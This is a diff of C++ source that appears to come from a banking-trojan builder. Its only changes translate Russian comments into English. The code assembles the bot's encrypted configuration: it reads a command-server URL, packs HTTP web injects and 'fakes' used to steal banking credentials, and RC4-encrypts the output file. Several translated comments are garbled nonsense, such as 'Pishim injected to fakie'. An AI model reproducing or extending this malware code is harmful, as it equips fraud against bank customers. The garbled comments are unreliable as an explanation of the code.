@@ -430,14 +430,14 @@ void BuildConfig::uninit(void)
 
 bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR destFolder)
 {
-  DWORD errorMsg = Languages::error_not_enough_memory; //Код ошибки.
+  DWORD errorMsg = Languages::error_not_enough_memory; //Error code.
 
   writeOutput(output, Languages::get(Languages::builder_config_begin));
 
   BinStorage::STORAGE *ph = BinStorage::_createEmpty();
   if(ph == NULL)goto EXIT_BAD;
 
-  //Получаем ключ шифрования.
+  //Obtain the encryption key.
   LPSTR encryptionKey;
   DWORD encryptionKeySize;
   Config0::VAR *pcv = Config0::_GetVar(NULL, config, NULL, "staticconfig");
@@ -455,7 +455,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
   }
   encryptionKey = pcv->pValues[1];
 
-  //Открываем DynamicConfig
+  //Open DynamicConfig
   if((pcv = Config0::_GetVar(NULL, config, NULL, "dynamicconfig")) == NULL)
   {
     errorMsg = Languages::builder_dynamicconfig_not_founded;
@@ -464,7 +464,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
 
   Config0::VAR *pcvc;
 
-  //Версия
+  //Version
   {
     DWORD version = BO_CLIENT_VERSION;
     if(!BinStorage::_addItem(&ph, CFGID_LAST_VERSION, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, &version, sizeof(DWORD)))goto EXIT_BAD;
@@ -479,7 +479,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
   }
 
   //url_server
-  //FIXME: Привязка к хостам.
+  //FIXME: Binding to the hosts.
   pcvc = Config0::_GetVar(pcv, NULL, "url_server", NULL);
   if(pcvc == NULL || pcvc->bValuesCount < 2){errorMsg = Languages::builder_dynamicconfig_url_server_not_founded; goto EXIT_BAD;}
   if(!BinStorage::_addItemAsUtf8StringA(&ph, CFGID_URL_SERVER_0, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION, pcvc->pValues[1]))goto EXIT_BAD;
@@ -541,7 +541,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
     if(ee != (DWORD)-1){errorMsg = ee; goto EXIT_BAD;}
   }
 
-  //Пишим инжекты, фейки.
+  //Pishim injected to fakie.
   if(injectsSize > 0)
   {
     bool ok = BinStorage::_addItem(&ph, CFGID_HTTP_INJECTS_LIST, BinStorage::ITEMF_COMBINE_OVERWRITE | BinStorage::ITEMF_IS_OPTION | BinStorage::ITEMF_COMPRESSED, injectsList, injectsSize);
@@ -549,7 +549,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
     if(!ok)goto EXIT_BAD;
   }
 
-  //Пишим образ.
+  //Pishim image.
   {
     Crypt::RC4KEY key;
     Crypt::_rc4Init(encryptionKey, encryptionKeySize, &key);
@@ -560,7 +560,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
     WCHAR file[MAX_PATH];
     LPSTR cfg;
 
-    //Получаем имя файла.
+    //Obtain the file name.
     if((pcv = Config0::_GetVar(NULL, config, NULL, "staticconfig")) && (pcv = Config0::_GetVar(pcv, NULL, "url_config", NULL)) &&
       pcv->bValuesCount > 1 && (cfg = CWA(shlwapi, PathFindFileNameA)(pcv->pValues[1])) && *cfg != 0)
     {
@@ -572,7 +572,7 @@ bool BuildConfig::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR
 
     if(!Gui::_browseForSaveFile(owner, destFolder, outputFile, NULL, NULL, 0) || !Fs::_saveToFile(outputFile, ph, packSize))
     {
-      //Fs::_removeFile(outputFile);
+      //Fs:: _removeFile (outputFile);
       errorMsg = Languages::error_fwrite_failed;
       goto EXIT_BAD;
     }
